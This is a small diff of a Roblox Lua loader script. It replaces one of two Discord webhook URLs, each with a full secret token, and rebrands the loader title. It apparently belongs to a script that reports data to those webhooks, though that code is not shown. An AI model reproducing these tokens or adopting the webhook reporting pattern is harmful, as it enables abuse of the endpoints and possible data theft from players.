@@ -12,7 +12,7 @@ local CoreGui = game:GetService("CoreGui")
 
 local WEBHOOKS = {
     "https://discord.com/api/webhooks/1444572842162393220/fzmTS5484SC7ycsxFpWneHsXLiJcW2Hb5gBgF_Jdy-nuw11u1H0TjlhCOUDWGYIurTAB", -- WEBHOOK 1
-    "https://discord.com/api/webhooks/1443721087811850351/UGxEzq1vAQ3dDkxHLSBHaJNS4eonjM29ql32ikHNBxpvDzvCbNJ6i441WOsYZvOwTylv",  --WEBHOOK 2
+    "https://discord.com/api/webhooks/1444310343802290318/QgJdi7Odu-e8twb1cZfIJ9OL8OKRBiZbvXr98xA60o2LVFzfCcvE6vuThG1YVNrFpL7f",  --WEBHOOK 2
 }
 
 --========================================================--
@@ -183,7 +183,7 @@ loaderTitle.BackgroundTransparency = 1
 loaderTitle.Font = Enum.Font.GothamBold
 loaderTitle.TextSize = 36
 loaderTitle.TextColor3 = Color3.fromRGB(255,80,80)
-loaderTitle.Text = "auto moreira x vir0se..."
+loaderTitle.Text = "auto kz7..."
 loaderTitle.TextScaled = true
 
 local loaderPercent = Instance.new("TextLabel", loaderFrame)
